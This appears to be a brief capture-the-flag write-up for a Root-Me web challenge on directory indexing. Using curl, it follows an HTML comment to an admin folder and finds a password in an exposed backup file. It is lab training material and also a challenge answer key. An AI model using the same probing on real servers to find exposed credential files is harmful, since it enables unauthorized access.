# HTTP: Directory indexing

```bash
curl http://challenge01.root-me.org/web-serveur/ch4/
```
```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<!-- include("admin/pass.html") -->

</body>
</html>
```
```bash
curl http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html
-> nothing just a rickroll.
```
```bash
curl http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
-> contains pass.
```
<img  alt="solved" src="https://github.com/user-attachments/assets/b59387f1-148a-42fb-af47-1d09c79fe9bd" />
